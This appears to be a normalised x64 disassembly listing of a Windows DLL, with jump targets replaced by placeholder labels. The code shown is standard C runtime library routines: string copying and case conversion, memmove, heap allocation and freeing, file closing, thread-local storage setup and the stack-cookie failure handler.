mov [ rbp + 0x30 ] rbx
mov [ rbp + 0x38 ] rsi
mov [ rbp + 0x40 ] rdi
mov rax [ rw-data ]
xor rax rbp
mov [ rbp ] rax
mov r12 r8
mov rsi rdx
mov rbx rcx
test rcx rcx
jne r-xdata
call sub_18000a1d8
cmp rax rsi
jb r-xdata
call sub_180006ee4
mov ebx 0x16
mov rax [ r12 ]
mov edx [ rax + 0x14 ]
test edx edx
je r-xdata
mov [ rbx ] 0x0
jmp r-xdata
mov eax ebx
cmp [ rbx ] 0x0
jne r-xdata
mov eax [ rax + 0x4 ]
mov [ rsp + 0x40 ] 0x1
mov r9 rbx
mov [ rsp + 0x38 ] eax
and [ rsp + 0x30 ] 0x0
and [ rsp + 0x28 ] 0x0
or [ rsp + 0x20 ] 0xffffffff
mov r8d 0x100
mov rcx r12
call sub_18000a140
movsxd r13 eax
test eax eax
jne r-xdata
mov al [ rbx ]
cmp al 0x41
jl r-xdata
xor eax eax
jmp r-xdata
mov rcx r13
cmp rsi r13
jae r-xdata
call sub_180006ee4
mov ebx 0x2a
mov [ rax ] ebx
inc rbx
cmp al 0x5a
jg r-xdata
mov rcx [ rbp ]
xor rcx rbp
call sub_180006220
mov rbx [ rbp + 0x30 ]
mov rsi [ rbp + 0x38 ]
mov rdi [ rbp + 0x40 ]
lea rsp [ rbp + 0x10 ]
pop r13
pop r12
pop rbp
retn
test eax eax
jle r-xdata
mov [ rbx ] 0x0
call sub_180006ee4
mov ebx 0x22
jmp r-xdata
add al 0x20
mov [ rbx ] al
xor edi edi
xor edx edx
lea rax [ rdx - 0x20 ]
div rcx
cmp rax 0x1
jb r-xdata
mov [ rax ] ebx
call sub_180008e08
jmp r-xdata
mov rcx [ r12 ]
mov [ rsp + 0x40 ] 0x1
mov r9 rbx
mov eax [ rcx + 0x4 ]
mov edx [ rcx + 0x14 ]
mov r8d 0x100
mov [ rsp + 0x38 ] eax
mov [ rsp + 0x30 ] r13d
mov rcx r12
mov [ rsp + 0x28 ] rdi
or [ rsp + 0x20 ] 0xffffffff
call sub_18000a140
test eax eax
je r-xdata
call sub_180006ee4
mov [ rax ] 0xc
jmp r-xdata
add rcx 0x10
cmp rcx 0x400
ja r-xdata
call sub_180006ee4
mov ebx 0x2a
mov [ rax ] ebx
mov r8 rdi
mov rdx rsi
mov rcx rbx
call sub_180009e10
mov ebx eax
jmp r-xdata
call sub_180006ee4
mov eax [ rax ]
jmp r-xdata
call sub_180006de4
mov rdi rax
test rax rax
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
call sub_180006da4
lea rcx [ rdi - 0x10 ]
cmp [ rcx ] 0xdddd
jne r-xdata
test rdi rdi
jne r-xdata
mov [ rax ] 0xdddd
and rax 0xfffffffffffffff0
call sub_18000a210
sub rsp rax
lea rdi [ rsp + 0x50 ]
test rdi rdi
je r-xdata
mov rax 0xffffffffffffff0
mov [ rdi ] 0xcccc
jmp r-xdata
add rdi 0x10
jmp r-xdata
sub_1800066dc
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x40
mov rdi rcx
mov rbx rdx
lea rcx [ rsp + 0x20 ]
mov rdx r8
call sub_18000643c
lea r8 [ rsp + 0x20 ]
mov rdx rbx
mov rcx rdi
call sub_1800064e0
cmp [ rsp + 0x38 ] 0x0
je r-xdata
mov rbx [ rsp + 0x50 ]
add rsp 0x40
pop rdi
retn
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_180006728
push rbx
sub rsp 0x20
xor edx edx
mov rbx rcx
cmp [ rw-data ] edx
jne r-xdata
xor r8d r8d
or rdx 0xffffffffffffffff
call sub_1800066dc
test rcx rcx
jne r-xdata
mov rax rcx
cmp [ rcx ] dl
je r-xdata
call sub_180006ee4
mov [ rax ] 0x16
call sub_180008e08
xor eax eax
jmp r-xdata
mov rax rbx
mov cl [ rax ]
cmp cl 0x41
jl r-xdata
add rsp 0x20
pop rbx
retn
inc rax
cmp [ rax ] dl
jne r-xdata
cmp cl 0x5a
jg r-xdata
jmp r-xdata
add cl 0x20
mov [ rax ] cl
sub_18000678c
jmp r-xdata
mov al [ rcx ]
test al al
jne r-xdata
cmp al dl
je r-xdata
cmp al dl
jne r-xdata
mov rax rcx
retn
inc rcx
xor eax eax
retn
sub_1800067a8
mov [ rsp + 0x18 ] r8
push rbx
sub rsp 0x20
mov rbx r8
cmp edx 0x1
jne r-xdata
test edx edx
jne r-xdata
call sub_18000b234
test eax eax
jne r-xdata
cmp edx 0x2
jne r-xdata
mov eax [ rw-data ]
test eax eax
jle r-xdata
call sub_180007be4
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
cmp edx 0x3
jne r-xdata
call sub_1800078e4
mov edx 0x2c8
mov ecx 0x1
call sub_18000a4e0
mov rbx rax
test rax rax
je r-xdata
dec eax
mov [ rw-data ] eax
cmp [ rw-data ] edx
jne r-xdata
call sub_18000b1c4
call [ GetCommandLineA@IAT ]
mov [ rw-data ] rax
call sub_18000b0d0
mov [ rw-data ] rax
call sub_18000a990
test eax eax
jns r-xdata
call sub_18000b28c
jmp r-xdata
add rsp 0x20
pop rbx
retn
mov eax 0x1
xor ecx ecx
call sub_180007ba4
mov rdx rax
mov ecx [ rw-data ]
call [ FlsSetValue@IAT ]
mov rcx rbx
test eax eax
je r-xdata
test rbx rbx
jne r-xdata
call sub_18000a958
call sub_18000afd8
test eax eax
js r-xdata
call sub_1800078e8
jmp r-xdata
call sub_180006da4
jmp r-xdata
xor edx edx
call sub_180007910
call [ GetCurrentThreadId@IAT ]
mov [ rbx ] eax
or [ rbx + 0x8 ] 0xffffffffffffffff
jmp r-xdata
test rbx rbx
jne r-xdata
call sub_18000ac64
call sub_1800078e8
call sub_18000b28c
nop
call sub_18000ac64
jmp r-xdata
call sub_18000acd8
test eax eax
js r-xdata
cmp [ rw-data ] 0xffffffff
je r-xdata
xor ecx ecx
call sub_18000a70c
test eax eax
jne r-xdata
call sub_1800078e8
jmp r-xdata
inc [ rw-data ]
jmp r-xdata
sub_1800068fc
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
sub rsp 0x30
mov rsi r8
mov ebx edx
mov r12 rcx
mov eax 0x1
test edx edx
jne r-xdata
cmp edx 0x1
je r-xdata
cmp [ rw-data ] edx
jne r-xdata
mov r9 [ r--data ]
test r9 r9
je r-xdata
cmp edx 0x2
jne r-xdata
xor eax eax
jmp r-xdata
test eax eax
je r-xdata
call r9
mov [ rsp + 0x20 ] eax
mov r8 rsi
mov edx ebx
mov rcx r12
call sub_180004084
mov edi eax
mov [ rsp + 0x20 ] eax
cmp ebx 0x1
jne r-xdata
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rdi [ rsp + 0x50 ]
add rsp 0x30
pop r12
retn
xor eax eax
jmp r-xdata
mov r8 rsi
mov edx ebx
mov rcx r12
call sub_1800067a8
mov [ rsp + 0x20 ] eax
test eax eax
jne r-xdata
test ebx ebx
je r-xdata
test eax eax
jne r-xdata
mov r8 rsi
mov edx ebx
mov rcx r12
call sub_1800067a8
neg eax
sbb ecx ecx
and ecx edi
mov edi ecx
mov [ rsp + 0x20 ] ecx
je r-xdata
cmp ebx 0x3
jne r-xdata
mov r8 rsi
xor edx edx
mov rcx r12
call sub_180004084
mov r8 rsi
xor edx edx
mov rcx r12
call sub_1800067a8
mov r11 [ r--data ]
test r11 r11
je r-xdata
mov eax edi
jmp r-xdata
mov rax [ r--data ]
test rax rax
je r-xdata
mov r8 rsi
xor edx edx
mov rcx r12
call r11
mov r8 rsi
mov edx ebx
mov rcx r12
call rax
mov edi eax
mov [ rsp + 0x20 ] eax
_start
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rdi r8
mov ebx edx
mov rsi rcx
cmp edx 0x1
jne r-xdata
mov r8 rdi
mov edx ebx
mov rcx rsi
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
jmp sub_1800068fc
call sub_18000b490
sub_180006a70
mov r11 rcx
sub rdx rcx
jb r-xdata
add rcx r8
cmp r8 0x8
jb r-xdata
cmp r8 0x8
jb r-xdata
test r8 r8
jne r-xdata
test cl 0x7
je r-xdata
test r8 r8
jne r-xdata
test cl 0x7
je r-xdata
dec rcx
mov al [ rdx + rcx ]
dec r8
mov [ rcx ] al
jne r-xdata
mov rax r11
retn
mov r9 r8
shr r9 0x5
jne r-xdata
test cl 0x1
je r-xdata
mov al [ rdx + rcx ]
mov [ rcx ] al
inc rcx
dec r8
jne r-xdata
mov rax r11
retn
mov r9 r8
shr r9 0x5
jne r-xdata
test cl 0x1
je r-xdata
mov rax r11
retn
cmp r9 0x2000
jae r-xdata
mov r9 r8
shr r9 0x3
je r-xdata
test cl 0x2
je r-xdata
dec rcx
mov al [ rdx + rcx ]
dec r8
mov [ rcx ] al
mov rax r11
retn
cmp r9 0x2000
jae r-xdata
mov r9 r8
shr r9 0x3
je r-xdata
test cl 0x2
je r-xdata
mov al [ rdx + rcx ]
dec r8
mov [ rcx ] al
inc rcx
cmp rdx 0xfffffffffffff000
ja r-xdata
mov rax [ rdx + rcx - 0x8 ]
mov r10 [ rdx + rcx - 0x10 ]
sub rcx 0x20
mov [ rcx + 0x18 ] rax
mov [ rcx + 0x10 ] r10
mov rax [ rdx + rcx + 0x8 ]
mov r10 [ rdx + rcx ]
dec r9
mov [ rcx + 0x8 ] rax
mov [ rcx ] r10
jne r-xdata
sub rcx 0x8
mov rax [ rdx + rcx ]
dec r9
mov [ rcx ] rax
jne r-xdata
test cl 0x4
je r-xdata
sub rcx 0x2
mov ax [ rdx + rcx ]
sub r8 0x2
mov [ rcx ] ax
cmp rdx 0x1000
jb r-xdata
mov rax [ rdx + rcx ]
mov r10 [ rdx + rcx + 0x8 ]
add rcx 0x20
mov [ rcx - 0x20 ] rax
mov [ rcx - 0x18 ] r10
mov rax [ rdx + rcx - 0x10 ]
mov r10 [ rdx + rcx - 0x8 ]
dec r9
mov [ rcx - 0x10 ] rax
mov [ rcx - 0x8 ] r10
jne r-xdata
mov rax [ rdx + rcx ]
mov [ rcx ] rax
add rcx 0x8
dec r9
jne r-xdata
test cl 0x4
je r-xdata
mov ax [ rdx + rcx ]
sub r8 0x2
mov [ rcx ] ax
add rcx 0x2
mov eax 0x20
and r8 0x1f
jmp r-xdata
and r8 0x7
sub rcx 0x4
mov eax [ rdx + rcx ]
sub r8 0x4
mov [ rcx ] eax
mov eax 0x20
and r8 0x1f
jmp r-xdata
and r8 0x7
mov eax [ rdx + rcx ]
sub r8 0x4
mov [ rcx ] eax
add rcx 0x4
sub rcx 0x80
prefetchnta [ rdx + rcx ]
prefetchnta [ rdx + rcx + 0x40 ]
dec eax
jne r-xdata
add rcx 0x1000
mov eax 0x40
prefetchnta [ rdx + rcx ]
prefetchnta [ rdx + rcx + 0x40 ]
add rcx 0x80
dec eax
jne r-xdata
sub rcx 0x1000
mov eax 0x40
mov r9 [ rdx + rcx - 0x8 ]
mov r10 [ rdx + rcx - 0x10 ]
movnti [ rcx - 0x8 ] r9
movnti [ rcx - 0x10 ] r10
mov r9 [ rdx + rcx - 0x18 ]
mov r10 [ rdx + rcx - 0x20 ]
movnti [ rcx - 0x18 ] r9
movnti [ rcx - 0x20 ] r10
mov r9 [ rdx + rcx - 0x28 ]
mov r10 [ rdx + rcx - 0x30 ]
sub rcx 0x40
movnti [ rcx + 0x18 ] r9
movnti [ rcx + 0x10 ] r10
mov r9 [ rdx + rcx + 0x8 ]
mov r10 [ rdx + rcx ]
dec eax
movnti [ rcx + 0x8 ] r9
movnti [ rcx ] r10
jne r-xdata
sub r8 0x1000
cmp r8 0x1000
jae r-xdata
mov r9 [ rdx + rcx ]
mov r10 [ rdx + rcx + 0x8 ]
movnti [ rcx ] r9
movnti [ rcx + 0x8 ] r10
mov r9 [ rdx + rcx + 0x10 ]
mov r10 [ rdx + rcx + 0x18 ]
movnti [ rcx + 0x10 ] r9
movnti [ rcx + 0x18 ] r10
mov r9 [ rdx + rcx + 0x20 ]
mov r10 [ rdx + rcx + 0x28 ]
add rcx 0x40
movnti [ rcx - 0x20 ] r9
movnti [ rcx - 0x18 ] r10
mov r9 [ rdx + rcx - 0x10 ]
mov r10 [ rdx + rcx - 0x8 ]
dec eax
movnti [ rcx - 0x10 ] r9
movnti [ rcx - 0x8 ] r10
jne r-xdata
sub r8 0x1000
cmp r8 0x1000
jae r-xdata
[ rsp ] 0x0
jmp r-xdata
[ rsp ] 0x0
jmp r-xdata
sub_180006da4
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov r8 rcx
mov rcx [ rw-data ]
xor edx edx
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
add rsp 0x20
pop rbx
call sub_180006ee4
mov rbx rax
call [ GetLastError@IAT ]
mov ecx eax
call sub_180006e9c
mov [ rbx ] eax
sub_180006de4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx rcx
cmp rcx 0xffffffffffffffe0
ja r-xdata
call sub_180007dd8
call sub_180006ee4
mov [ rax ] 0xc
xor eax eax
mov edi 0x1
test rcx rcx
cmovne rdi rcx
mov r8 rdi
xor edx edx
call [ HeapAlloc@IAT ]
mov rsi rax
test rax rax
jne r-xdata
call sub_18000b7d0
mov ecx 0x1e
call sub_18000b570
mov ecx 0xff
call sub_18000a628
mov rax rsi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
call sub_180006ee4
mov [ rax ] 0xc
mov rcx rbx
call sub_180007dd8
test eax eax
je r-xdata
call sub_180006ee4
mov [ rax ] 0xc
jmp r-xdata
mov rcx [ rw-data ]
test rcx rcx
jne r-xdata
sub_180006e9c
lea r9 [ rw-data ]
xor eax eax
mov rdx r9
lea r8d [ rax + 0x8 ]
cdqe
mov eax [ r9 + rax * 8 + 0x4 ]
retn
inc eax
add rdx r8
cmp eax 0x2d
jb r-xdata
cmp ecx [ rdx ]
je r-xdata
lea eax [ rcx - 0x13 ]
cmp eax 0x11
ja r-xdata
add ecx 0xffffff44
mov eax 0x16
cmp ecx 0xe
cmovbe eax r8d
retn
mov eax 0xd
retn
sub_180006f24
push rbx
sub rsp 0x20
mov ebx ecx
call sub_1800079c8
test rax rax
jne r-xdata
add rax 0x14
lea rax [ rw-data ]
jmp r-xdata
mov ecx ebx
call sub_180006e9c
mov [ r10 ] eax
add rsp 0x20
pop rbx
retn
lea r10 [ rax + 0x10 ]
mov [ rax ] ebx
call sub_1800079c8
lea r10 [ rw-data ]
test rax rax
je r-xdata
sub_180006f6c
mov r9 rcx
movzx ecx [ rdx ]
inc rdx
lea eax [ rcx - 0x41 ]
cmp eax 0x19
ja r-xdata
add r8d 0x20
test r8d r8d
je r-xdata
add ecx 0x20
sub r8d ecx
mov eax r8d
retn
cmp r8d ecx
je r-xdata
movzx r8d [ r9 ]
inc r9
lea eax [ r8 - 0x41 ]
cmp eax 0x19
ja r-xdata
sub_180006fa8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push rbp
mov rbp rsp
sub rsp 0x40
mov rsi rcx
mov rdi rdx
lea rcx [ rbp - 0x20 ]
mov rdx r8
call sub_18000643c
test rsi rsi
jne r-xdata
test rdi rdi
je r-xdata
call sub_180006ee4
mov [ rax ] 0x16
call sub_180008e08
cmp [ rbp - 0x8 ] 0x0
je r-xdata
mov rax [ rbp - 0x20 ]
cmp [ rax + 0x14 ] 0x0
jne r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
sub rsi rdi
mov rdx rdi
mov rcx rsi
call sub_180006f6c
cmp [ rbp - 0x8 ] 0x0
je r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
mov rdi [ rsp + 0x60 ]
add rsp 0x40
pop rbp
retn
sub ebx eax
cmp [ rbp - 0x8 ] 0x0
je r-xdata
cmp ebx eax
je r-xdata
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
mov eax ebx
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
movzx ecx [ rsi + rdi ]
lea rdx [ rbp - 0x20 ]
call sub_1800075c0
movzx ecx [ rdi ]
lea rdx [ rbp - 0x20 ]
mov ebx eax
call sub_1800075c0
inc rdi
test ebx ebx
je r-xdata
sub_180007080
sub rsp 0x28
cmp [ rw-data ] 0x0
jne r-xdata
xor r8d r8d
add rsp 0x28
jmp sub_180006fa8
test rcx rcx
jne r-xdata
test rdx rdx
je r-xdata
call sub_180006ee4
mov [ rax ] 0x16
call sub_180008e08
mov eax 0x7fffffff
add rsp 0x28
retn
add rsp 0x28
jmp sub_180006f6c
sub_1800070c8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx rdx
mov rdi rcx
test rcx rcx
jne r-xdata
test rdx rdx
jne r-xdata
mov rcx rdx
call sub_180006de4
jmp r-xdata
cmp rdx 0xffffffffffffffe0
ja r-xdata
call sub_180006da4
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rcx rbx
call sub_180007dd8
call sub_180006ee4
mov [ rax ] 0xc
mov rcx [ rw-data ]
mov eax 0x1
test rbx rbx
cmove rbx rax
mov r8 rdi
xor edx edx
mov r9 rbx
call [ HeapReAlloc@IAT ]
mov rsi rax
test rax rax
jne r-xdata
xor eax eax
mov rax rsi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
call sub_180006ee4
mov rbx rax
call [ GetLastError@IAT ]
mov ecx eax
call sub_180006e9c
mov [ rbx ] eax
mov rcx rbx
call sub_180007dd8
test eax eax
je r-xdata
call sub_180006ee4
mov rbx rax
call [ GetLastError@IAT ]
mov ecx eax
call sub_180006e9c
mov [ rbx ] eax
jmp r-xdata
cmp rbx 0xffffffffffffffe0
jbe r-xdata
sub_1800071b0
mov r11 rcx
or r8 r8
je r-xdata
mov rax r11
retn
sub rcx rdx
test dl 0x7
je r-xdata
mov rax [ rdx ]
sub r8 0x8
jbe r-xdata
mov al [ rdx ]
test al al
mov [ rcx + rdx ] al
je r-xdata
add r8 0x8
je r-xdata
mov r9 0x7efefefefefefeff
add r9 rax
mov r10 rax
xor r10 0xffffffffffffffff
xor r10 r9
mov r9 0x8101010101010100
test r9 r10
je r-xdata
add rcx rdx
xor rdx rdx
cmp r8 0x10
jb r-xdata
inc rdx
dec r8
je r-xdata
mov rax r11
retn
test al al
mov [ rcx + rdx ] al
je r-xdata
mov [ rcx + rdx ] rax
add rdx 0x8
sub r8 0x1
jb r-xdata
test cl 0x7
je r-xdata
test dl 0x7
jne r-xdata
inc rdx
dec r8
je r-xdata
mov rax r11
retn
mov [ rcx ] dl
inc rcx
jmp r-xdata
sub r8 0x20
jb r-xdata
inc rcx
mov [ rcx ] dl
dec r8
jmp r-xdata
jmp r-xdata
test ah ah
mov [ rcx + rdx ] ah
je r-xdata
add r8 0x20
mov [ rcx ] rdx
mov [ rcx + 0x8 ] rdx
mov [ rcx + 0x10 ] rdx
mov [ rcx + 0x18 ] rdx
add rcx 0x20
sub r8 0x20
jae r-xdata
inc rdx
dec r8
je r-xdata
add r8 0x8
mov [ rcx ] rdx
add rcx 0x8
jmp r-xdata
shr rax 0x10
test al al
mov [ rcx + rdx ] al
je r-xdata
sub r8 0x8
jb r-xdata
inc rdx
dec r8
je r-xdata
test ah ah
mov [ rcx + rdx ] ah
je r-xdata
inc rdx
dec r8
je r-xdata
shr rax 0x10
test al al
mov [ rcx + rdx ] al
je r-xdata
inc rdx
dec r8
je r-xdata
test ah ah
mov [ rcx + rdx ] ah
je r-xdata
inc rdx
dec r8
je r-xdata
shr eax 0x10
test al al
mov [ rcx + rdx ] al
je r-xdata
inc rdx
dec r8
je r-xdata
test ah ah
mov [ rcx + rdx ] ah
je r-xdata
inc rdx
dec r8
jne r-xdata
sub_180007314
mov r9 rcx
xor r8d r8d
mov al [ rcx ]
inc rcx
test al al
jne r-xdata
dec rcx
cmp rcx r9
je r-xdata
cmp [ rcx ] dl
cmove r8 rcx
mov rax r8
retn
cmp [ rcx ] dl
jne r-xdata
sub_18000733c
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
or edi 0xffffffff
mov rbx rcx
test rcx rcx
jne r-xdata
test [ rcx + 0x18 ] 0x83
je r-xdata
call sub_180006ee4
mov [ rax ] 0x16
call sub_180008e08
or eax edi
jmp r-xdata
and [ rbx + 0x18 ] 0x0
mov eax edi
call sub_18000bc84
mov rcx rbx
mov edi eax
call sub_18000bc4c
mov rcx rbx
call sub_18000baa4
mov ecx eax
call sub_18000bb88
test eax eax
jns r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx [ rbx + 0x28 ]
test rcx rcx
je r-xdata
or edi 0xffffffff
jmp r-xdata
call sub_180006da4
and [ rbx + 0x28 ] 0x0
sub_1800073b8
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x20
mov rbx rcx
or edi 0xffffffff
xor eax eax
test rcx rcx
setne al
test eax eax
jne r-xdata
test [ rcx + 0x18 ] 0x40
je r-xdata
call sub_180006ee4
mov [ rax ] 0x16
call sub_180008e08
call sub_18000b924
nop
mov rcx rbx
call sub_18000733c
mov edi eax
mov rcx rbx
call sub_18000b9bc
jmp r-xdata
and [ rcx + 0x18 ] 0x0
jmp r-xdata
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov eax edi
jmp r-xdata
sub_180007450
test rdx rdx
je r-xdata
retn
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rdi rcx
mov rcx rdx
mov rbx rdx
call sub_18000be60
mov rsi rax
lea rcx [ rax + 0x1 ]
call sub_180006de4
mov [ rdi + 0x8 ] rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
lea rdx [ rsi + 0x1 ]
mov r8 rbx
mov rcx rax
call sub_180009e10
mov [ rdi + 0x10 ] 0x1
sub_1800074d4
push rbx
sub rsp 0x20
and [ rcx + 0x8 ] 0x0
lea rax [ r--data ]
mov [ rcx + 0x10 ] 0x0
mov [ rcx ] rax
mov rdx [ rdx ]
mov rbx rcx
call sub_180007450
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_180007504
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rdx
mov rbx rcx
cmp rcx rdx
je r-xdata
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
call sub_1800074ac
cmp [ rdi + 0x10 ] 0x0
je r-xdata
mov rax [ rdi + 0x8 ]
mov [ rbx + 0x8 ] rax
mov rdx [ rdi + 0x8 ]
mov rcx rbx
call sub_180007450
jmp r-xdata
sub_180007558
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov ebx edx
mov rdi rcx
mov [ rcx ] rax
call sub_1800074ac
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_180006da4#2
sub_1800075c0
mov [ rsp + 0x10 ] rdi
mov [ rsp + 0x20 ] r12
push rbp
mov rbp rsp
sub rsp 0x70
movsxd rdi ecx
lea rcx [ rbp - 0x20 ]
call sub_18000643c
cmp edi 0x100
jae r-xdata
mov rax [ rbp - 0x20 ]
cmp [ rax + 0x10c ] 0x1
jle r-xdata
mov rdx [ rbp - 0x20 ]
cmp [ rdx + 0x10c ] 0x1
jle r-xdata
call sub_180006ee4
mov edx 0x1
mov [ rax ] 0x2a
mov [ rbp + 0x10 ] dil
mov [ rbp + 0x11 ] 0x0
mov r12d edi
lea rdx [ rbp - 0x20 ]
sar r12d 0x8
movzx ecx r12b
call sub_18000bf08
test eax eax
je r-xdata
mov rax [ rdx + 0x140 ]
movzx eax [ rax + rdi * 2 ]
and eax 0x1
lea r8 [ rbp - 0x20 ]
mov edx 0x1
mov ecx edi
call sub_18000bf98
mov rdx [ rbp - 0x20 ]
jmp r-xdata
cmp [ rbp - 0x8 ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ rbp + 0x20 ]
je r-xdata
mov [ rbp + 0x10 ] r12b
mov [ rbp + 0x11 ] dil
mov [ rbp + 0x12 ] 0x0
mov edx 0x2
jmp r-xdata
mov rax [ rdx + 0x148 ]
movzx eax [ rax + rdi ]
jmp r-xdata
test eax eax
je r-xdata
mov eax edi
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rbp - 0x8 ] 0x0
je r-xdata
movzx ecx [ rbp + 0x21 ]
shl eax 0x8
or eax ecx
mov rcx [ rbp - 0x20 ]
mov [ rsp + 0x40 ] 0x1
lea r9 [ rbp + 0x10 ]
mov eax [ rcx + 0x4 ]
mov r8d 0x100
mov [ rsp + 0x38 ] eax
lea rax [ rbp + 0x20 ]
mov [ rsp + 0x30 ] 0x3
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] edx
mov edx [ rcx + 0x14 ]
lea rcx [ rbp - 0x20 ]
call sub_18000a140
test eax eax
je r-xdata
lea r11 [ rsp + 0x70 ]
mov rdi [ r11 + 0x18 ]
mov r12 [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_180007730
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov ebx edx
mov rdi rcx
mov [ rcx ] rax
call sub_18000c080
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_180006da4#2
sub_18000778c
mov [ rsp + 0x8 ] rcx
sub rsp 0x88
lea rcx [ rw-data ]
call [ RtlCaptureContext@IAT ]
mov rax [ rw-data ]
mov [ rsp + 0x58 ] rax
xor r8d r8d
lea rdx [ rsp + 0x60 ]
mov rcx [ rsp + 0x58 ]
call RtlLookupFunctionEntry
mov [ rsp + 0x50 ] rax
cmp [ rsp + 0x50 ] 0x0
je r-xdata
mov rax [ rsp + 0x88 ]
mov [ rw-data ] rax
lea rax [ rsp + 0x88 ]
add rax 0x8
mov [ rw-data ] rax
mov [ rsp + 0x38 ] 0x0
lea rax [ rsp + 0x48 ]
mov [ rsp + 0x30 ] rax
lea rax [ rsp + 0x40 ]
mov [ rsp + 0x28 ] rax
lea rax [ rw-data ]
mov [ rsp + 0x20 ] rax
mov r9 [ rsp + 0x50 ]
mov r8 [ rsp + 0x58 ]
mov rdx [ rsp + 0x60 ]
xor ecx ecx
call RtlVirtualUnwind
jmp r-xdata
call [ GetCurrentProcess@IAT ]
mov edx 0xc0000409
mov rcx rax
call [ TerminateProcess@IAT ]
add rsp 0x88
retn
mov ecx 0x1
call sub_18000c1b0
mov rax [ rw-data ]
mov [ rw-data ] rax
mov rax [ rsp + 0x90 ]
mov [ rw-data ] rax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov rax [ rw-data ]
mov [ rsp + 0x68 ] rax
mov rax [ rw-data ]
mov [ rsp + 0x70 ] rax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
mov ecx 0x1
call sub_18000c1b0
xor ecx ecx
call [ SetUnhandledExceptionFilter@IAT ]
lea rcx [ r--data ]
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
sub_180007910
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rdx
mov rbx rcx
lea rax [ r--data ]
mov [ rcx + 0xa0 ] rax
and [ rcx + 0x10 ] 0x0
mov [ rcx + 0x1c ] 0x1
mov [ rcx + 0xc8 ] 0x1
mov [ rcx + 0x174 ] 0x43
mov [ rcx + 0x1f7 ] 0x43
lea rax [ rw-data ]
mov [ rcx + 0xb8 ] rax
mov ecx 0xd
call sub_18000c3c4
nop
mov rax [ rbx + 0xb8 ]
[ rax ]
mov ecx 0xd
call sub_18000c2c4
mov ecx 0xc
call sub_18000c3c4
nop
mov [ rbx + 0xc0 ] rdi
test rdi rdi
jne r-xdata
mov rcx [ rbx + 0xc0 ]
call sub_180009a10
nop
mov ecx 0xc
call sub_18000c2c4
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rax [ rw-data ]
mov [ rbx + 0xc0 ] rax
sub_1800079c8
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
mov edi eax
call [ FlsGetValue@IAT ]
mov rbx rax
test rax rax
jne r-xdata
mov ecx edi
call [ SetLastError@IAT ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
lea ecx [ rax + 0x1 ]
mov edx 0x2c8
call sub_18000a4e0
mov rbx rax
test rax rax
je r-xdata
mov ecx [ rw-data ]
mov rdx rax
call [ FlsSetValue@IAT ]
mov rcx rbx
test eax eax
je r-xdata
call sub_180006da4
xor ebx ebx
xor edx edx
call sub_180007910
call [ GetCurrentThreadId@IAT ]
